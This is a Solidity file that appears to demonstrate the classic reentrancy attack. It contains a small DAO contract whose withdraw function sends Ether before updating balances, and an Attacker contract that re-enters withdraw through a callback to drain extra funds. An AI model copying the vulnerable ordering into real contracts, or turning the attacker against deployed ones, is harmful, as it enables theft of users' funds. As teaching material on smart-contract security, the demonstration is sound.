// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.14;

contract MiniDAO {
    mapping(address => uint256) balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        if (balances[msg.sender] < amount) revert();
        //msg.sender.send(amount);
        msg.sender.call{value: amount}(abi.encodeWithSignature("recur()"));
        balances[msg.sender] -= amount;
    }
}

contract Attacker {
    // limit the recursive calls to prevent out-of-gas error
    uint256 stack = 0;
    uint256 constant stackLimit = 3;
    uint256 amount;
    MiniDAO dao;

    constructor(address daoAddress) payable {
        dao = MiniDAO(daoAddress);
        amount = msg.value / 10;
        dao.deposit{value: msg.value}();
    }

    function attack() public {
        dao.withdraw(amount);
    }

    function recur() public payable {
        if (stack++ < stackLimit) {
            dao.withdraw(amount);
        }
    }
}
